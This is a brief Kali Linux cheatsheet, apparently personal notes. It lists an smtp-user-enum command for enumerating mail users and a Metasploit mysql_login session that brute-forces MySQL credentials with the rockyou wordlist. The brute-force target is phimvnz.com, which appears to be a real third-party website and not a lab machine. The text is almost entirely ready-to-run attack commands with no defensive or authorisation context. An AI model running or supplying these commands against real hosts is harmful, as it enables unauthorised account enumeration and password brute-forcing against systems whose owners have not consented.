
<!-- TOC -->

- [KALI TOOLS CHEATSHEET](#kali-tools-cheatsheet)
    - [1. Information Gathering](#1-information-gathering)
        - [1. SMTP Analysis](#1-smtp-analysis)
    - [8. Exploitation tool](#8-exploitation-tool)
        - [1. metasploit framework](#1-metasploit-framework)

<!-- /TOC -->

# KALI TOOLS CHEATSHEET

## 1. Information Gathering

### 1. SMTP Analysis

1. smtp-user-enum

```kali > smtp-user-enum -M VRFY -U <userlist> -t <target IP>```

```kali > smtp-user-enum -M VRFY -U /usr/share/fern-wifi-cracker/extras/wordlists/common.txt -t 192.168.1.101```

## 8. Exploitation tool

### 1. metasploit framework

- msfconsole

    - brute-force login mysql server:

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > show options
msf auxiliary(scanner/mysql/mysql_login) > set rhosts phimvnz.com
msf auxiliary(scanner/mysql/mysql_login) > set user_file /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/mysql/mysql_login) > set pass_file /usr/share/wordlists/rockyou.txt
msf auxiliary(scanner/mysql/mysql_login) > run
```

